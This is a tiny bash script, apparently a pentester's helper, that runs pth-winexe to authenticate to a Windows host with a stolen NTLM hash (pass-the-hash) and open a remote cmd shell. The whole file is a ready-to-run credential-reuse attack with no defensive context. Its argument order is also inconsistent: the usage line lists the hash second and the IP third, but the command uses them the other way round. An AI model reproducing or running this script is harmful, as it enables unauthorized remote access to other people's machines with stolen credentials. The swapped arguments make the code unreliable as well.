#!/bin/bash

#Usage: ./pth.sh [USERNAME] [NTLM_HASH] [IP_ADDR]

echo $1,$2,$3
pth-winexe -U $1%aad3b435b51404eeaad3b435b51404ee:$3 //$2 cmd
